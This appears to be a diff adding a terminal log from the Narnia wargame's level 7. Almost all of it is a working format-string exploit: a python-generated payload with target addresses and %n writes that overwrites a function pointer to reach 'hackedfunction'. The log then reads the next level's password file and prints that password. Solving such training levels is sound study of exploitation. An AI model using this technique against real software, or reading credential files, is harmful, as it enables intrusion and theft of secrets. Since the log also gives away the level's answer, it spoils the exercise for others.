@@ -1,0 +1,8 @@
+narnia7@narnia:/narnia$ ./narnia7 `python -c 'print "\x18\xd6\xff\xffAAAA\x1a\xd6\xff\xff%34584x%n%32992x%n"'`
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd648)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ cat /etc/narnia_pass/narnia8
+mohthuphog
